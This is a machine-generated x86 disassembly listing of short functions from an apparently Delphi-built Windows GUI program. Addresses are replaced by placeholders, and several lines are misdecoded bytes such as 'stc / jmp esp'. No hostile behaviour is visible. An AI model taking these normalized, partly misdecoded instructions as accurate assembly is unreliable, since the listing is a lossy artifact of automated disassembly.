pop ecx
pop ebp
retn
sub_444188
retn
sub_4441f0
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44455d
jmp sub_403960
sub_444744
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_444930
jmp sub_403960
sub_4449e0
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_4449f4
inc [ eax + 0x6c ]
retn
sub_4449f8
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_446278
sub_444b58
call sub_445258
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_445503
jmp sub_403960
sub_44550a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445527
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_445520
jmp sub_403960
sub_445527
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445808
jmp sub_403960
sub_44580f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44582c
mov eax [ ebp - 0x4 ]
call sub_41d428
retn
sub_445825
jmp sub_403960
sub_44582c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445849
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_445842
jmp sub_403960
sub_445849
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445cfd
jmp sub_403960
sub_445d04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445e8f
jmp sub_403960
sub_445e96
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_445f4b
jmp sub_403960
sub_445f52
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446040
jmp sub_403960
sub_446091
jmp sub_403960
sub_446098
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446154
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444a64
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4462a0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_4445a0
sub_446ba0
jmp sub_403960
sub_446ba7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446c70
call GetCapture
retn
sub_446c78
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c810
pop ebx
retn
sub_446c88
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_446eee
jmp sub_403960
sub_4470e8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4472fc
jmp sub_403960
sub_447303
pop ebx
mov esp ebp
pop ebp
retn
sub_44734e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_4473cb
jmp sub_403960
sub_4473d2
pop ebp
retn
sub_44745a
jmp sub_403960
sub_447461
pop ebp
retn
sub_447bb0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413974
retn
sub_447bc8
mov al 0x1
retn
sub_447bcc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419820
retn
mov eax edx
retn
sub_447bdc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4197f0
retn
mov al 0x1
retn
sub_447ecc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413918
pop esi
pop ebx
retn
sub_447ee0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_447f1c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_448180
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_448194
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_4481a8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_4481bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_4481d0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_4481e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_4481f8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_44820c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_448220
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_448234
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
pop ebx
retn
sub_448248
retn
sub_44824c
retn
sub_448250
retn
sub_448254
retn
sub_448258
retn
sub_44825c
retn
sub_448260
retn
sub_448264
retn
sub_448268
retn
sub_44826c
retn
sub_448270
retn
sub_448274
retn
sub_448520
jmp sub_403960
sub_4488bc
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x90 ] eax
sub_4488e4
push esi
mov si 0xffef
call sub_403420
pop esi
retn
sub_448985
jmp sub_403960
sub_44898c
pop ebp
retn
sub_448990
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
sub_448b30
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_448cb5
jmp sub_403960
sub_448cbc
pop ebx
pop ecx
pop ebp
retn
sub_448cc0
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_448cc8
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_448e98
sub_448d75
jmp sub_403960
sub_448d7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403224
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_448f2b
jmp sub_403960
sub_448f32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448fca
jmp sub_403960
sub_448fd1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448fee
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_448fe7
jmp sub_403960
sub_448fee
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403420
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4490a7
jmp sub_403960
sub_4490ae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4490b4
or edx 0xffffffff
call sub_449028
retn
sub_4494c3
jmp sub_403960
sub_4494ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4494e7
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_4494e0
jmp sub_403960
sub_4494e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449504
mov eax [ ebp - 0x4 ]
call sub_449ffc
retn
sub_4494fd
jmp sub_403960
sub_449504
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449708
jmp sub_403960
sub_44970f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449714
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403420
sub_44972c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_4124bc
pop ebx
retn
sub_4497d0
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4137bc
sub_4498e7
jmp sub_403960
sub_4498ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403224
retn
sub_449904
jmp sub_403960
sub_449c16
jmp sub_403960
sub_449c1d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449c3a
mov eax [ ebp - 0x10 ]
call sub_403224
retn
sub_449c33
jmp sub_403960
sub_449c3a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449c57
mov eax [ ebp - 0x8 ]
call sub_403224
retn
sub_449c50
jmp sub_403960
sub_449c57
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449cc0
jmp sub_403960
sub_449dd9
jmp sub_403960
sub_449df6
jmp sub_403960
sub_449fae
jmp sub_403960
sub_449fb5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449ff8
inc [ eax + 0x5c ]
retn
sub_449ffc
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403420
sub_44a050
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44a08d
jmp sub_403960
sub_44a094
pop ebp
retn
sub_44a098
sub [ rw-data ] 0x1
retn
sub_44afa3
jmp [ eax + eax ]
sub_44b000
mov eax [ esp + 0x8 ]
retn
sub_44b008
push ebx
mov ebx eax
call sub_44b000
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
jmp sub_403998
sub_44b024
pop ebx
retn
sub_44b29d
jmp sub_403960
sub_44b2a4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b3ef
jmp sub_403960
sub_44b3f6
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b40c
push ebx
mov eax [ rw-data ]
call sub_413e18
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413dec
mov eax ebx
pop ebx
retn
sub_44b594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44b5b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44bcab
jmp sub_403960
sub_44bcb2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bdaa
jmp sub_403960
sub_44bdb1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c1d4
jmp sub_403960
sub_44c1db
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44c687
jmp sub_403960
sub_44cb28
jmp sub_403960
sub_44cb2f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44cf93
jmp sub_403960
sub_44d450
jmp sub_403960
sub_44d457
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d802
jmp sub_403960
sub_44d809
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44d817
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44d9c4
mov eax [ r-xdata ]
retn
sub_44da00
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44da14
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44da24
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44da34
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44dd30
mov edx eax
sub_44dacc
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d4
mov edx esi
call sub_44da4c
pop esi
pop ebx
retn
sub_44db48
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44dd30
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413974
mov ecx eax
sub_44df20
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44df88
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_44e330
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44e364
sub_44e364
mov edx sub_44e33c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44b48c
retn
sub_44e54e
jmp sub_403960
sub_44e555
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e9ec
jmp sub_403960
sub_44ea2b
jmp sub_403960
sub_44ea32
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ebd0
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ed0c
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403420
pop esi
pop ebp
retn 0x8
sub_44ed28
mov eax [ eax + 0x34 ]
call sub_44bf60
retn
sub_44ed34
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403420
pop esi
retn
sub_44ed70
push ebx
mov ecx sub_44ed48
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44b48c
pop ebx
retn
sub_44efa4
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44efb8
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_4036ac#8
jmp sub_4036ac
sub_44f1ef
jmp sub_403960
sub_44f21a
jmp sub_403960
sub_44f221
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44f238
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44f420
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44ed70
sub_44f4a0
jmp sub_403960
sub_44f4e4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44f4fc
push ebx
mov ebx eax
mov eax ebx
call sub_419840
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44f54e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44ed70
sub_44f5c4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44f70d
jmp sub_403960
sub_44f714
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f954
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44f964
sub_44f9b8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44f9c8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44f9d8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44f9e8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44f9f8
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44fa70
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44bdb8
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44bdb8
retn
sub_44fa8c
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44bdb8
sub_44fad4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44ed28
retn
mov eax edx
retn
sub_44fb0e
jmp sub_4036ac
sub_44fb13
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fe79
jmp sub_403960
sub_44fe80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403224
retn
sub_44fe96
jmp sub_403960
sub_44ff97
jmp sub_403960
sub_44ff9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffbb
mov eax [ ebp - 0x14 ]
call sub_403224
retn
sub_44ffb4
jmp sub_403960
sub_44ffd9
jmp sub_403960
sub_450063
jmp sub_403960
sub_45006a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45009c
push ebx
mov ebx eax
mov eax ebx
call sub_413a5c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a5f0
sub_450160
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_450174
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45017c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_450541
jmp sub_403960
sub_450548
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450648
jmp sub_403960
sub_45064f
pop ebp
retn
sub_451207
[ edi + edi * 8 - 0x2f002f ]
sub_45120e
stc
jmp esp
sub_4524d0
mov eax [ rw-data ]
retn
sub_4524d8
mov [ rw-data ] eax
retn
sub_452620
jmp sub_4036ac
sub_452657
jmp sub_403960
sub_45265e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45282c
call sub_41a518
retn
sub_45296e
jmp sub_403960
sub_452975
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452a19
jmp sub_403960
sub_452a20
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452ab0
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_4531dc
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_453888
sub_4531f8
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_4531dc
sub_453318
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_453888
sub_453330
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_453888
sub_453348
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_453888
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_453374
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_453380
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_453888
retn
sub_453660
push ebx
mov ebx edx
mov edx ebx
call sub_43f258
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4536d0
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_4537f8
jmp sub_403960
sub_4537ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453808
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_452c14
mov eax [ ebx + 0x20c ]
call sub_452c14
sub_453868
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_453878
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_453973
jmp sub_403960
sub_453980
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_453998
sub_453bb4
retn
sub_453c22
jmp sub_403960
sub_453c61
jmp sub_403960
sub_453c94
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_440750
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_452ea0
retn
sub_453cb8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_440770
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_452ea0
retn
sub_453dad
jmp sub_403960
sub_453db4
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_452b08
mov eax [ ebp - 0x4 ]
call sub_453888
sub_453ee8
jmp sub_403960
sub_453f20
jmp sub_403960
sub_453f27
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f47
lea eax [ ebp - 0x114 ]
call sub_403f5c
retn
sub_453f40
jmp sub_403960
sub_453f47
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_45424e
jmp sub_403960
sub_454255
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403580
j_sub_4036ac#9
jmp sub_4036ac
sub_454325
jmp sub_4036ac
sub_45432a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4546e2
jmp sub_403960
sub_4546e9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4547c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4177d0
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4547dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454814
mov edx eax
mov eax esi
call sub_419058
pop esi
pop ebx
retn
sub_4547f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bb8
mov edx eax
mov eax esi
call sub_419058
pop esi
pop ebx
retn
sub_454814
push ebx
mov ebx eax
mov eax ebx
call sub_455858
mov edx r-xdata
call sub_41d3ac
pop ebx
retn
sub_454918
push ebx
mov ebx eax
mov eax ebx
call sub_454928
xor al 0x1
pop ebx
retn
sub_454928
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_454984
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4549a4
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4549c4
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_454cbd
jmp sub_403960
sub_454cc4
pop ecx
pop ebp
retn
sub_454cc8
xor eax eax
retn
sub_454fa0
jmp sub_403960
sub_454fa7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_454fbd
jmp sub_403960
sub_4550a7
jmp sub_403960
sub_4550ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4550cb
mov eax [ ebp - 0xc ]
call sub_403224
retn
sub_4550c4
jmp sub_403960
sub_4550eb
jmp sub_403960
sub_4553d6
jmp sub_403960
sub_455569
jmp sub_403960
sub_455858
mov eax [ eax + 0x238 ]
retn
sub_455860
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45586c
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_455baa
jmp sub_403960
sub_455bb1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455bb8
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_455c00
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43f96c
sub_455c1c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_455c58
push ebx
mov ebx eax
mov eax ebx
call sub_441900
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41cc90
sub_455cdc
push ebx
mov ebx eax
mov eax ebx
call sub_441928
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d450
sub_455cfc
push ebx
mov ebx eax
mov eax ebx
call sub_45591c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_4559e4
pop ebx
retn
sub_456529
lea eax [ ebp - 0xb4 ]
call sub_403f5c
retn
sub_456535
jmp sub_403960
j_sub_456529
jmp sub_456529
sub_45653c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456694
jmp sub_403960
sub_45669b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456980
jmp sub_403960
sub_456987
mov eax [ rw-data ]
call sub_459238
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45699e
add [ eax ] al
retn
sub_456bfc
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_456c1c
mov eax [ eax + 0x240 ]
call sub_4215f4
test eax eax
jne r-xdata
retn
